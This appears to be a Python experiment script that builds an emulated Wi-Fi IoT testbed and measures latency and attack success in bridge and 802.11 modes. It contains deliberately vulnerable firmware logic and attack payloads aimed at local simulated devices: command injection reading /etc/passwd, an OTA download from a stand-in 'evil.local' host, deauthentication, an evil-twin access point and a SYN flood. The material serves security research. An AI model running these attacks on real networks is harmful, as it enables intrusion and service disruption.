#!/usr/bin/env python3
"""
VESPER RQ-N1: Bridge vs. 802.11 Emulation Divergence — Native Linux

Self-contained experiment that runs directly on a Linux host with
mac80211_hwsim. No Docker needed.

Architecture (802.11 mode):
    hwsim radio 0  →  wlan0  →  hostapd (AP)
    hwsim radio 1  →  wlan1  →  wpa_supplicant (sta1, netns ns-sta1)
    hwsim radio 2  →  wlan2  →  wpa_supplicant (sta2, netns ns-sta2)

Architecture (bridge mode):
    veth0a/veth0b  →  Linux bridge "br-vesper"
    veth1a/veth1b  →  Linux bridge "br-vesper"

Both modes run:
    - matter_bridge Matter broker
    - socat-based firmware emulators (TCP serial ports)
    - tshark packet capture
    - iperf3 throughput test
    - ping RTT measurement

Measurements:
    ✓ ICMP RTT (100 pings per device)
    ✓ TCP handshake RTT (50 connections per device)
    ✓ RTT jitter (stdev of ICMP RTT)
    ✓ 802.11 retransmissions (wlan.fc.retry via tshark)
    ✓ WiFi-layer attack success (deauth, evil twin, ARP spoof)
    ✓ Firmware attack success (serial protocol attacks)
    ✓ Network attack success (Matter, TCP)
    ✓ Reconnection dynamics (deauth → reassociate time)
    ✓ iperf3 throughput

Usage (on Linux VM):
    sudo python3 scripts/run_rqn1_native.py --full --trials 3
    sudo python3 scripts/run_rqn1_native.py --bridge-only --trials 3
    sudo python3 scripts/run_rqn1_native.py --wifi-only --trials 3

Requires:  sudo (for namespace creation, hostapd, hwsim management)
"""

from __future__ import annotations
import argparse
import json
import logging
import os
import shutil
import signal
import socket
import statistics
import subprocess
import sys
import textwrap
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional

from wmediumd_helper import WmediumdManager, SCENARIOS as WMEDIUMD_SCENARIOS

logger = logging.getLogger("vesper.rqn1")

# Global wmediumd manager (set by main() when --wmediumd is used)
_wmediumd_mgr: Optional[WmediumdManager] = None

SEED = 42
AP_IP = "192.168.4.1"
STA_IPS = ["192.168.4.10", "192.168.4.11"]
BRIDGE_IP = "172.20.0.1"
BRIDGE_STA_IPS = ["172.20.0.10", "172.20.0.11"]
SSID = "VESPER-IoT-Network"
PSK = "vesper-secure-2026"
CHANNEL = 6
Matter_PORT = 8484
SERIAL_PORTS = [5561, 5562]
FIRMWARE_TYPES = ["smart_light", "motion_sensor"]

# ══════════════════════════════════════════════════════════════════════════
# Firmware Simulator (lightweight serial-port responder)
# ══════════════════════════════════════════════════════════════════════════

class FirmwareSimulator:
    """
    Minimal TCP server that mimics ESP32 QEMU serial behavior.
    Responds to VESPER firmware probe commands so the attack framework
    can test for vulnerabilities. Runs in a background thread.
    """
    def __init__(self, port: int, device_type: str):
        self.port = port
        self.device_type = device_type
        self._server = None
        self._thread = None
        self._running = False
        self.connections = 0
        self.commands_received = 0

    def start(self):
        self._running = True
        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False
        if self._server:
            self._server.close()

    def _serve(self):
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server.settimeout(1.0)
        self._server.bind(("0.0.0.0", self.port))
        self._server.listen(5)
        while self._running:
            try:
                conn, addr = self._server.accept()
                self.connections += 1
                threading.Thread(target=self._handle, args=(conn,), daemon=True).start()
            except socket.timeout:
                continue
            except OSError:
                break

    def _handle(self, conn: socket.socket):
        """Handle one serial connection — respond to firmware probe commands."""
        conn.settimeout(5.0)
        try:
            while self._running:
                data = conn.recv(4096)
                if not data:
                    break
                self.commands_received += 1
                cmd = data.decode(errors="replace").strip()

                # Simulate various firmware responses
                if "version" in cmd.lower() or "info" in cmd.lower():
                    resp = f"VESPER-ESP32 v1.0.3 [{self.device_type}]\r\nOK\r\n"
                elif "config" in cmd.lower() or "get" in cmd.lower():
                    resp = json.dumps({
                        "device_type": self.device_type,
                        "matter_bridge": AP_IP,
                        "matter_bridge_port": Matter_PORT,
                        "firmware": "1.0.3",
                        "wifi_ssid": SSID,
                        "wifi_pass": PSK,  # Deliberate vulnerability: plaintext creds
                    }) + "\r\n"
                elif "reboot" in cmd.lower() or "restart" in cmd.lower():
                    resp = "Rebooting...\r\nOK\r\n"
                elif "factory" in cmd.lower() or "reset" in cmd.lower():
                    resp = "Factory reset initiated\r\nOK\r\n"
                elif "update" in cmd.lower() or "ota" in cmd.lower():
                    resp = "OTA update accepted\r\nURL: http://update.local/fw.bin\r\nOK\r\n"
                elif len(cmd) > 256:
                    # Buffer overflow test — firmware "crashes"
                    resp = "FATAL: stack overflow at 0x400d1234\r\nrebooting...\r\n"
                elif ";" in cmd or "|" in cmd or "`" in cmd:
                    # Command injection — firmware executes it
                    resp = f"sh: {cmd}: executed\r\nOK\r\n"
                elif "AT+" in cmd:
                    resp = "OK\r\n"
                else:
                    resp = "ERROR: unknown command\r\n"
                conn.sendall(resp.encode())
        except (socket.timeout, ConnectionError, OSError):
            pass
        finally:
            conn.close()


# ══════════════════════════════════════════════════════════════════════════
# 802.11 Mode Setup (mac80211_hwsim)
# ══════════════════════════════════════════════════════════════════════════

def setup_wifi_mode(output_dir: str) -> Dict[str, Any]:
    """
    Set up real 802.11 topology using mac80211_hwsim.

    CRITICAL: Stations MUST be in separate network namespaces.
    Without namespaces, the kernel short-circuits routing and never
    sends traffic through the wireless stack, causing ARP/ping to fail
    even though wpa_supplicant shows COMPLETED.

    Architecture:
        wlan0 (phy0)  →  root namespace  →  hostapd AP
        wlan1 (phy1)  →  ns-sta0         →  wpa_supplicant station 0
        wlan2 (phy2)  →  ns-sta1         →  wpa_supplicant station 1
    """
    logger.info("Setting up 802.11 mode (mac80211_hwsim)...")

    # Clean up any previous state
    _run("killall hostapd wpa_supplicant 2>/dev/null || true")
    time.sleep(0.5)
    for i in range(2):
        _run(f"ip netns del ns-sta{i} 2>/dev/null || true")
    _run("modprobe -r mac80211_hwsim 2>/dev/null || true")
    time.sleep(1)
    _run("modprobe mac80211_hwsim radios=4")
    time.sleep(2)

    # ── Start wmediumd channel emulator (if enabled) ──────────────
    global _wmediumd_mgr
    if _wmediumd_mgr is not None:
        macs = WmediumdManager.get_hwsim_mac_addresses()
        logger.info(f"  Starting wmediumd with {len(macs)} hwsim MACs: {macs}")
        if not _wmediumd_mgr.start(mac_addresses=macs):
            logger.warning("  ⚠ wmediumd failed to start — falling back to perfect medium")
        else:
            logger.info(f"  ✓ wmediumd running (model={_wmediumd_mgr.config.model_type}, "
                        f"path_loss_exp={_wmediumd_mgr.config.path_loss_exp})")

    # Get sorted interfaces and their phy mappings
    result = _run("ls -1 /sys/class/net/ | grep wlan | sort")
    ifaces = [x for x in result.strip().split("\n") if x.startswith("wlan")]
    logger.info(f"  Available WiFi interfaces: {ifaces}")
    if len(ifaces) < 3:
        raise RuntimeError(f"Need ≥3 wlan interfaces, got {len(ifaces)}: {ifaces}")

    # Map interfaces to their phy names
    phy_map = {}
    for iface in ifaces:
        phy = _run(f"cat /sys/class/net/{iface}/phy80211/name 2>/dev/null").strip()
        phy_map[iface] = phy
        logger.info(f"    {iface} → {phy}")

    ap_iface = ifaces[0]      # wlan0 → AP (stays in root ns)
    sta_ifaces = ifaces[1:3]  # wlan1, wlan2 → stations (move to namespaces)

    # ── Configure AP (root namespace) ─────────────────────────────────
    hostapd_conf = f"""\
interface={ap_iface}
driver=nl80211
ssid={SSID}
hw_mode=g
channel={CHANNEL}
wpa=2
wpa_passphrase={PSK}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
ieee80211w=0
ctrl_interface=/var/run/hostapd
"""
    conf_path = f"{output_dir}/hostapd.conf"
    with open(conf_path, "w") as f:
        f.write(hostapd_conf)

    _run(f"ip link set {ap_iface} up")
    _run(f"ip addr flush dev {ap_iface}")
    _run(f"ip addr add {AP_IP}/24 dev {ap_iface}")

    _run("mkdir -p /var/run/hostapd")
    hostapd_log = f"{output_dir}/hostapd.log"
    _run(f"hostapd -B {conf_path} -f {hostapd_log}")
    time.sleep(2)

    r = _run("pgrep -c hostapd || echo 0")
    if r.strip() == "0":
        log_content = _run(f"cat {hostapd_log}")
        raise RuntimeError(f"hostapd failed to start. Log:\n{log_content}")
    logger.info(f"  hostapd running on {ap_iface}")

    # ── Move station phys into network namespaces ─────────────────────
    sta_ns_names = []
    for i, (sta_iface, sta_ip) in enumerate(zip(sta_ifaces, STA_IPS)):
        ns = f"ns-sta{i}"
        sta_ns_names.append(ns)
        phy = phy_map[sta_iface]

        _run(f"ip netns add {ns}")
        _run(f"iw phy {phy} set netns name {ns}")
        logger.info(f"  Moved {phy} ({sta_iface}) → {ns}")

        # Verify interface exists in namespace
        ns_ifaces = _run(f"ip netns exec {ns} ls /sys/class/net/").strip().split()
        sta_if_in_ns = [x for x in ns_ifaces if x.startswith("wlan")]
        if not sta_if_in_ns:
            logger.error(f"  No wlan interface found in {ns}! Found: {ns_ifaces}")
            continue

        # The interface name inside the ns may differ; use whatever we find
        actual_iface = sta_if_in_ns[0]
        if actual_iface != sta_iface:
            logger.info(f"    Interface renamed in ns: {sta_iface} → {actual_iface}")

        # Bring up lo and the wlan interface inside ns
        _run(f"ip netns exec {ns} ip link set lo up")
        _run(f"ip netns exec {ns} ip link set {actual_iface} up")

        # Write wpa_supplicant config
        wpa_conf = f"""\
ctrl_interface=/var/run/wpa_supplicant
ctrl_interface_group=0
network={{
    ssid="{SSID}"
    psk="{PSK}"
    key_mgmt=WPA-PSK
    scan_ssid=1
}}
"""
        wpa_conf_path = f"{output_dir}/wpa_sta{i}.conf"
        with open(wpa_conf_path, "w") as f:
            f.write(wpa_conf)

        # Start wpa_supplicant inside the namespace
        wpa_log = f"{output_dir}/wpa_sta{i}.log"
        _run(f"ip netns exec {ns} wpa_supplicant -B -i {actual_iface} "
             f"-c {wpa_conf_path} -D nl80211 -f {wpa_log}")
        logger.info(f"  wpa_supplicant started on {actual_iface} in {ns}")

    # Wait for WPA handshake (up to 30s)
    logger.info("  Waiting for WPA associations (up to 30s)...")
    for wait in range(30):
        time.sleep(1)
        all_done = True
        for i, ns in enumerate(sta_ns_names):
            state = _run(f"ip netns exec {ns} wpa_cli -i wlan{i+1} status 2>/dev/null "
                         f"| grep wpa_state= | cut -d= -f2").strip()
            if state != "COMPLETED":
                # Try alternate interface name
                ns_ifaces = _run(f"ip netns exec {ns} ls /sys/class/net/").strip().split()
                for iface in ns_ifaces:
                    if iface.startswith("wlan"):
                        state = _run(f"ip netns exec {ns} wpa_cli -i {iface} status 2>/dev/null "
                                     f"| grep wpa_state= | cut -d= -f2").strip()
                        if state == "COMPLETED":
                            break
            if state != "COMPLETED":
                all_done = False
        if all_done:
            logger.info(f"  All stations associated after {wait+1}s")
            break
    else:
        logger.warning("  Not all stations associated within 30s")

    # Assign static IPs and verify connectivity
    connected = 0
    actual_sta_ifaces = []
    for i, (ns, sta_ip) in enumerate(zip(sta_ns_names, STA_IPS)):
        # Find the actual wlan interface name in this ns
        ns_ifaces = _run(f"ip netns exec {ns} ls /sys/class/net/").strip().split()
        actual = next((x for x in ns_ifaces if x.startswith("wlan")), None)
        if not actual:
            logger.error(f"  No wlan interface in {ns}")
            actual_sta_ifaces.append(None)
            continue
        actual_sta_ifaces.append(actual)

        _run(f"ip netns exec {ns} ip addr add {sta_ip}/24 dev {actual}")
        time.sleep(0.5)

        # Verify ping
        for attempt in range(5):
            r = _run(f"ip netns exec {ns} ping -c1 -W2 {AP_IP} 2>/dev/null || echo FAIL")
            if "FAIL" not in r and "1 received" in r:
                connected += 1
                logger.info(f"  ✓ {ns}:{actual} ({sta_ip}) → AP: reachable")
                break
            time.sleep(1)
        else:
            logger.warning(f"  ✗ {ns}:{actual} ({sta_ip}) → AP: NOT reachable")

    logger.info(f"  WiFi topology: {connected}/{len(STA_IPS)} stations connected")

    return {
        "mode": "wifi",
        "ap_iface": ap_iface,
        "sta_ifaces": actual_sta_ifaces,  # interface names INSIDE their namespaces
        "sta_ns": sta_ns_names,            # namespace names for each station
        "ap_ip": AP_IP,
        "sta_ips": STA_IPS[:connected],
        "connected": connected,
    }


def teardown_wifi_mode():
    """Tear down 802.11 topology."""
    logger.info("Tearing down 802.11 mode...")
    # Stop wmediumd first (before killing hostapd/wpa_supplicant)
    global _wmediumd_mgr
    if _wmediumd_mgr is not None:
        _wmediumd_mgr.stop()
        logger.info("  wmediumd stopped")
    _run("killall wmediumd 2>/dev/null || true")
    _run("killall hostapd 2>/dev/null || true")
    _run("killall wpa_supplicant 2>/dev/null || true")
    time.sleep(0.5)
    for i in range(2):
        _run(f"ip netns exec ns-sta{i} killall wpa_supplicant 2>/dev/null || true")
        _run(f"ip netns del ns-sta{i} 2>/dev/null || true")
    # Clean up wlan IPs
    for iface in ["wlan0", "wlan1", "wlan2", "wlan3"]:
        _run(f"ip addr flush dev {iface} 2>/dev/null || true")
    _run("modprobe -r mac80211_hwsim 2>/dev/null || true")
    time.sleep(1)


# ══════════════════════════════════════════════════════════════════════════
# Bridge Mode Setup
# ══════════════════════════════════════════════════════════════════════════

def setup_bridge_mode(output_dir: str) -> Dict[str, Any]:
    """
    Set up Docker-bridge-equivalent topology using Linux bridges + veth pairs.
    No 802.11 involved — just L2 switching.
    """
    logger.info("Setting up bridge mode (Linux bridge + veth)...")

    # Create bridge
    _run("ip link del br-vesper 2>/dev/null || true")
    _run("ip link add br-vesper type bridge")
    _run("ip link set br-vesper up")
    _run(f"ip addr add {BRIDGE_IP}/24 dev br-vesper")

    # Create veth pairs for each "device"
    for i, sta_ip in enumerate(BRIDGE_STA_IPS):
        ns = f"ns-bridge{i}"
        _run(f"ip netns del {ns} 2>/dev/null || true")
        _run(f"ip netns add {ns}")

        # Create veth pair
        _run(f"ip link add veth{i}a type veth peer name veth{i}b")

        # Bridge side
        _run(f"ip link set veth{i}a master br-vesper")
        _run(f"ip link set veth{i}a up")

        # Namespace side
        _run(f"ip link set veth{i}b netns {ns}")
        _run(f"ip netns exec {ns} ip link set veth{i}b up")
        _run(f"ip netns exec {ns} ip addr add {sta_ip}/24 dev veth{i}b")
        _run(f"ip netns exec {ns} ip route add default via {BRIDGE_IP}")
        _run(f"ip netns exec {ns} ip link set lo up")

        logger.info(f"  Bridge station {ns} → {sta_ip}")

    # Enable forwarding
    _run("sysctl -w net.ipv4.ip_forward=1")
    time.sleep(1)

    # Verify
    connected = 0
    for i, sta_ip in enumerate(BRIDGE_STA_IPS):
        ns = f"ns-bridge{i}"
        r = _run(f"ip netns exec {ns} ping -c1 -W2 {BRIDGE_IP} 2>/dev/null || echo FAIL")
        if "FAIL" not in r and "1 received" in r:
            connected += 1
            logger.info(f"  ✓ ns-bridge{i} → bridge: reachable")
        else:
            logger.warning(f"  ✗ ns-bridge{i} → bridge: NOT reachable")

    logger.info(f"  Bridge topology: {connected}/{len(BRIDGE_STA_IPS)} devices connected")

    return {
        "mode": "bridge",
        "bridge_iface": "br-vesper",
        "ap_ip": BRIDGE_IP,
        "sta_ips": BRIDGE_STA_IPS[:connected],
        "connected": connected,
    }


def teardown_bridge_mode():
    """Tear down bridge topology."""
    logger.info("Tearing down bridge mode...")
    for i in range(2):
        _run(f"ip netns del ns-bridge{i} 2>/dev/null || true")
        _run(f"ip link del veth{i}a 2>/dev/null || true")
    _run("ip link del br-vesper 2>/dev/null || true")


# ══════════════════════════════════════════════════════════════════════════
# Matter Broker
# ══════════════════════════════════════════════════════════════════════════

def start_matter_bridge(output_dir: str, bind_ip: str = "0.0.0.0") -> subprocess.Popen:
    """Start matter_bridge Matter broker."""
    conf = f"""\
listener {Matter_PORT} {bind_ip}
allow_anonymous true
log_dest file {output_dir}/matter_bridge.log
"""
    conf_path = f"{output_dir}/matter_bridge.conf"
    with open(conf_path, "w") as f:
        f.write(conf)

    _run("killall matter_bridge 2>/dev/null || true")
    time.sleep(0.5)
    proc = subprocess.Popen(
        ["matter_bridge", "-c", conf_path],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    time.sleep(1)
    logger.info(f"  Matter broker started on {bind_ip}:{Matter_PORT}")
    return proc


def stop_matter_bridge(proc: Optional[subprocess.Popen]):
    if proc:
        proc.terminate()
        proc.wait(timeout=5)
    _run("killall matter_bridge 2>/dev/null || true")


# ══════════════════════════════════════════════════════════════════════════
# Measurements
# ══════════════════════════════════════════════════════════════════════════

def measure_icmp_rtt(target_ip: str, count: int = 100, ns: str = None, src_iface: str = None) -> Dict:
    """Measure ICMP RTT via ping."""
    prefix = f"ip netns exec {ns}" if ns else ""
    iface_opt = f"-I {src_iface}" if src_iface else ""
    try:
        result = _run(f"{prefix} ping -c {count} -i 0.05 -W 2 {iface_opt} {target_ip} 2>/dev/null")
        rtts = []
        for line in result.splitlines():
            if "time=" in line:
                try:
                    t = float(line.split("time=")[1].split()[0])
                    rtts.append(t)
                except (ValueError, IndexError):
                    pass

        if rtts:
            return {
                "count": len(rtts),
                "min_ms": round(min(rtts), 3),
                "max_ms": round(max(rtts), 3),
                "mean_ms": round(statistics.mean(rtts), 3),
                "median_ms": round(statistics.median(rtts), 3),
                "stdev_ms": round(statistics.stdev(rtts), 3) if len(rtts) > 1 else 0.0,
                "p95_ms": round(sorted(rtts)[int(0.95 * len(rtts))], 3),
                "p99_ms": round(sorted(rtts)[int(0.99 * len(rtts))], 3),
                "raw": rtts,
            }
    except Exception as e:
        logger.error(f"ICMP RTT to {target_ip} failed: {e}")
    return {"count": 0, "error": "measurement failed"}


def measure_tcp_rtt(target_ip: str, port: int, count: int = 50) -> Dict:
    """Measure TCP handshake RTT (SYN → SYN-ACK)."""
    rtts = []
    for _ in range(count):
        try:
            start = time.perf_counter_ns()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, port))
            elapsed_ns = time.perf_counter_ns() - start
            rtts.append(elapsed_ns / 1_000_000)
            sock.close()
        except Exception:
            pass
        time.sleep(0.02)

    if rtts:
        return {
            "count": len(rtts),
            "min_ms": round(min(rtts), 3),
            "max_ms": round(max(rtts), 3),
            "mean_ms": round(statistics.mean(rtts), 3),
            "stdev_ms": round(statistics.stdev(rtts), 3) if len(rtts) > 1 else 0.0,
            "raw": rtts,
        }
    return {"count": 0, "error": "all connections failed"}


def measure_retransmissions(iface: str, duration: int = 15) -> Dict:
    """Count 802.11 retransmissions via tshark."""
    try:
        pcap_tmp = f"/tmp/retx_{int(time.time())}.pcap"
        _run(f"timeout {duration} tshark -i {iface} -w {pcap_tmp} -q 2>/dev/null || true")

        # Count retry frames
        result = _run(f"tshark -r {pcap_tmp} -Y 'wlan.fc.retry==1' 2>/dev/null | wc -l")
        retry_count = int(result.strip()) if result.strip().isdigit() else 0

        # Count total frames
        result = _run(f"tshark -r {pcap_tmp} -Y 'wlan' 2>/dev/null | wc -l")
        total_frames = int(result.strip()) if result.strip().isdigit() else 0

        os.remove(pcap_tmp) if os.path.exists(pcap_tmp) else None

        return {
            "duration_s": duration,
            "total_80211_frames": total_frames,
            "retransmissions": retry_count,
            "retry_rate": round(retry_count / total_frames * 100, 2) if total_frames > 0 else 0,
        }
    except Exception as e:
        return {"duration_s": duration, "retransmissions": 0, "error": str(e)}


def measure_throughput(target_ip: str, duration: int = 5, ns: str = None) -> Dict:
    """Measure TCP throughput via iperf3."""
    # Start server on main namespace
    _run("killall iperf3 2>/dev/null || true")
    server_proc = subprocess.Popen(
        ["iperf3", "-s", "-p", "5201", "-1"],  # -1 = handle one client then exit
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    time.sleep(1)

    prefix = f"ip netns exec {ns}" if ns else ""
    try:
        result = _run(f"{prefix} iperf3 -c {target_ip} -p 5201 -t {duration} -J 2>/dev/null")
        if result:
            data = json.loads(result)
            bps = data.get("end", {}).get("sum_sent", {}).get("bits_per_second", 0)
            return {"tcp_mbps": round(bps / 1_000_000, 2)}
    except Exception as e:
        pass
    finally:
        server_proc.terminate()
        _run("killall iperf3 2>/dev/null || true")

    return {"tcp_mbps": None, "error": "iperf3 failed"}


def measure_reconnection(ap_iface: str, sta_ns: str, sta_ip: str) -> Dict:
    """
    Send deauth (disconnect station), measure time to reassociate.
    This is the key 802.11-specific measurement that bridge mode CANNOT produce.
    """
    # Verify reachable first (ping from station namespace)
    r = _run(f"ip netns exec {sta_ns} ping -c1 -W2 {AP_IP} 2>/dev/null || echo FAIL")
    if "FAIL" in r or "1 received" not in r:
        return {"error": "station not reachable before deauth"}

    # Get station MAC from hostapd
    sta_mac = None
    r = _run(f"hostapd_cli -i {ap_iface} all_sta 2>/dev/null")
    for line in r.splitlines():
        line = line.strip()
        if len(line) == 17 and line.count(":") == 5:  # MAC address format
            sta_mac = line
            break

    if not sta_mac:
        # Try reading from wlan interface inside namespace
        ns_ifaces = _run(f"ip netns exec {sta_ns} ls /sys/class/net/").strip().split()
        for iface in ns_ifaces:
            if iface.startswith("wlan"):
                mac = _run(f"ip netns exec {sta_ns} cat /sys/class/net/{iface}/address 2>/dev/null").strip()
                if mac and mac != "00:00:00:00:00:00":
                    sta_mac = mac
                    break

    if not sta_mac:
        return {"error": "could not determine station MAC"}

    # Send deauth using hostapd_cli
    _run(f"hostapd_cli -i {ap_iface} deauthenticate {sta_mac}")
    deauth_time = time.time()

    # Poll until station is reachable again (wpa_supplicant auto-reconnects)
    for _ in range(100):  # 10s max
        time.sleep(0.1)
        r = _run(f"ip netns exec {sta_ns} ping -c1 -W1 {AP_IP} 2>/dev/null || echo FAIL")
        if "FAIL" not in r and "1 received" in r:
            reconnect_ms = (time.time() - deauth_time) * 1000
            return {
                "reconnection_ms": round(reconnect_ms, 1),
                "sta_mac": sta_mac,
                "method": "hostapd_cli deauthenticate",
            }

    return {"reconnection_ms": 10000.0, "note": "did not reconnect within 10s"}


# ══════════════════════════════════════════════════════════════════════════
# Attack Execution
# ══════════════════════════════════════════════════════════════════════════

def run_firmware_attacks(serial_ports: List[int]) -> List[Dict]:
    """
    Run firmware attacks against simulated ESP32 serial ports.
    These attacks are protocol-level and work identically over bridge or 802.11.
    """
    attacks = [
        ("buffer_overflow", lambda p: _attack_buffer_overflow(p)),
        ("command_injection", lambda p: _attack_command_injection(p)),
        ("credential_dump", lambda p: _attack_credential_dump(p)),
        ("unauthorized_ota", lambda p: _attack_unauthorized_ota(p)),
        ("factory_reset", lambda p: _attack_factory_reset(p)),
        ("at_command_abuse", lambda p: _attack_at_command(p)),
        ("format_string", lambda p: _attack_format_string(p)),
        ("integer_overflow", lambda p: _attack_integer_overflow(p)),
        ("default_creds", lambda p: _attack_default_creds(p)),
    ]

    results = []
    for port in serial_ports:
        for attack_name, attack_fn in attacks:
            try:
                success, evidence = attack_fn(port)
                results.append({
                    "port": port,
                    "attack": attack_name,
                    "category": "firmware",
                    "success": success,
                    "evidence": evidence,
                })
            except Exception as e:
                results.append({
                    "port": port,
                    "attack": attack_name,
                    "category": "firmware",
                    "success": False,
                    "evidence": [f"error: {e}"],
                })
            time.sleep(0.1)  # cooldown

    return results


def _serial_send(port: int, cmd: str, timeout: float = 3.0) -> str:
    """Send command to firmware simulator and get response."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect(("127.0.0.1", port))
        sock.sendall((cmd + "\n").encode())
        time.sleep(0.2)
        resp = sock.recv(4096).decode(errors="replace")
        sock.close()
        return resp
    except Exception as e:
        return f"ERROR: {e}"


def _attack_buffer_overflow(port: int) -> tuple:
    resp = _serial_send(port, "A" * 512)
    success = "stack overflow" in resp.lower() or "fatal" in resp.lower()
    return success, [resp[:200]]


def _attack_command_injection(port: int) -> tuple:
    resp = _serial_send(port, "config; cat /etc/passwd")
    success = "executed" in resp.lower() or "sh:" in resp.lower()
    return success, [resp[:200]]


def _attack_credential_dump(port: int) -> tuple:
    resp = _serial_send(port, "get config")
    success = "wifi_pass" in resp or "psk" in resp.lower()
    return success, [resp[:200]]


def _attack_unauthorized_ota(port: int) -> tuple:
    resp = _serial_send(port, "update firmware http://evil.local/malware.bin")
    success = "ota" in resp.lower() and ("accepted" in resp.lower() or "ok" in resp.lower())
    return success, [resp[:200]]


def _attack_factory_reset(port: int) -> tuple:
    resp = _serial_send(port, "factory reset")
    success = "factory reset" in resp.lower() and "ok" in resp.lower()
    return success, [resp[:200]]


def _attack_at_command(port: int) -> tuple:
    resp = _serial_send(port, "AT+GMR")
    success = "ok" in resp.lower()
    return success, [resp[:200]]


def _attack_format_string(port: int) -> tuple:
    resp = _serial_send(port, "%x%x%x%x%x%x%x%x")
    # Format string attacks should NOT reveal memory — if they do, it's a vuln
    success = any(c in resp for c in "0123456789abcdef") and "error" not in resp.lower()
    return success, [resp[:200]]


def _attack_integer_overflow(port: int) -> tuple:
    resp = _serial_send(port, f"set brightness {2**32 + 1}")
    success = "ok" in resp.lower() or "error" not in resp.lower()
    return success, [resp[:200]]


def _attack_default_creds(port: int) -> tuple:
    resp = _serial_send(port, "login admin admin")
    success = "ok" in resp.lower() or "welcome" in resp.lower()
    return success, [resp[:200]]


def run_network_attacks(target_ip: str, matter_bridge_port: int, ns: str = None) -> List[Dict]:
    """Run network-layer attacks (Matter, TCP)."""
    prefix = f"ip netns exec {ns}" if ns else ""
    results = []

    # 1. Matter anonymous subscribe (should succeed if no auth)
    r = _run(f"{prefix} timeout 3 matter_bridge_sub -h {target_ip} -p {matter_bridge_port} -t '#' -C 1 2>/dev/null || echo FAIL")
    # We pub a test message first
    _run(f"matter_bridge_pub -h {target_ip} -p {matter_bridge_port} -t vesper/test -m test_payload 2>/dev/null")
    time.sleep(0.5)
    results.append({
        "attack": "matter_anonymous_subscribe",
        "category": "network",
        "success": "FAIL" not in r,
        "evidence": [r[:200]],
    })

    # 2. Matter topic enumeration
    r = _run(f"timeout 3 matter_bridge_sub -h {target_ip} -p {matter_bridge_port} -t '$SYS/#' -C 1 -v 2>/dev/null || echo TIMEOUT")
    results.append({
        "attack": "matter_sys_topic_enum",
        "category": "network",
        "success": "TIMEOUT" not in r and len(r.strip()) > 0,
        "evidence": [r[:200]],
    })

    # 3. TCP SYN flood (short burst)
    try:
        r = _run(f"{prefix} timeout 3 hping3 -S -p {matter_bridge_port} -c 50 --fast {target_ip} 2>&1 || echo FAIL")
        results.append({
            "attack": "tcp_syn_flood",
            "category": "network",
            "success": "FAIL" not in r,
            "evidence": [r[:200]],
        })
    except Exception:
        results.append({
            "attack": "tcp_syn_flood",
            "category": "network",
            "success": False,
            "evidence": ["hping3 not available"],
        })

    # 4. Matter message injection
    r = _run(f"matter_bridge_pub -h {target_ip} -p {matter_bridge_port} -t 'vesper/kitchen-light-01/cmd' -m '{{\"switch\":\"off\"}}' 2>/dev/null && echo SUCCESS || echo FAIL")
    results.append({
        "attack": "matter_command_injection",
        "category": "network",
        "success": "SUCCESS" in r,
        "evidence": [r[:200]],
    })

    # 5. Matter will message abuse
    r = _run(f"matter_bridge_pub -h {target_ip} -p {matter_bridge_port} -t 'vesper/status' -m 'DEVICE_OFFLINE' --will-topic 'vesper/alarm' --will-payload 'triggered' 2>/dev/null && echo SUCCESS || echo FAIL")
    results.append({
        "attack": "matter_will_abuse",
        "category": "network",
        "success": "SUCCESS" in r,
        "evidence": [r[:200]],
    })

    return results


def run_wifi_attacks(ap_iface: str, sta_iface: str, sta_ns: str, sta_ip: str, output_dir: str) -> List[Dict]:
    """
    Run WiFi-layer attacks that require 802.11.
    These attacks are IMPOSSIBLE in bridge mode — that's the whole point of RQ-N1.
    """
    results = []

    # Get station MAC from hostapd's connected stations
    sta_mac = None
    r = _run(f"hostapd_cli -i {ap_iface} all_sta 2>/dev/null")
    for line in r.splitlines():
        line = line.strip()
        if len(line) == 17 and line.count(":") == 5:
            sta_mac = line
            break
    if not sta_mac:
        sta_mac = _run(f"ip netns exec {sta_ns} cat /sys/class/net/{sta_iface}/address 2>/dev/null").strip()

    # 1. Deauthentication attack
    if sta_mac:
        _run(f"hostapd_cli -i {ap_iface} deauthenticate {sta_mac}")
        time.sleep(2)
        r = _run(f"ip netns exec {sta_ns} ping -c1 -W2 {AP_IP} 2>/dev/null || echo FAIL")
        deauth_success = "FAIL" in r  # success = station is now disconnected
        results.append({
            "attack": "wifi_deauth",
            "category": "wifi",
            "success": deauth_success,
            "evidence": [f"deauthed {sta_mac}, ping result: {'unreachable' if deauth_success else 'still reachable'}"],
        })
        # Wait for reconnect
        time.sleep(5)

    # 2. Evil twin detection (check if we can create a second AP)
    evil_conf = textwrap.dedent(f"""\
        interface=wlan3
        driver=nl80211
        ssid={SSID}
        hw_mode=g
        channel={CHANNEL}
        wpa=2
        wpa_passphrase=evil-twin-pass
        wpa_key_mgmt=WPA-PSK
        rsn_pairwise=CCMP
    """)
    evil_conf_path = f"{output_dir}/evil_twin.conf"
    with open(evil_conf_path, "w") as f:
        f.write(evil_conf)

    try:
        _run("ip link set wlan3 up 2>/dev/null")
        r = _run(f"timeout 5 hostapd {evil_conf_path} 2>&1 || true")
        evil_twin_success = "AP-ENABLED" in r or "wlan3" in _run("iw dev wlan3 info 2>/dev/null || true")
        results.append({
            "attack": "evil_twin_ap",
            "category": "wifi",
            "success": evil_twin_success,
            "evidence": [r[:200]],
        })
    except Exception as e:
        results.append({
            "attack": "evil_twin_ap",
            "category": "wifi",
            "success": False,
            "evidence": [str(e)[:200]],
        })
    finally:
        _run("killall -9 hostapd 2>/dev/null; sleep 0.5; hostapd -B /tmp/vesper_ap.conf 2>/dev/null || true")

    # 3. ARP spoofing (from station namespace)
    r = _run(f"ip netns exec {sta_ns} arping -c 3 -w 3 -I {sta_iface} {AP_IP} 2>/dev/null || echo FAIL")
    results.append({
        "attack": "arp_spoof",
        "category": "wifi",
        "success": "FAIL" not in r,
        "evidence": [r[:200]],
    })

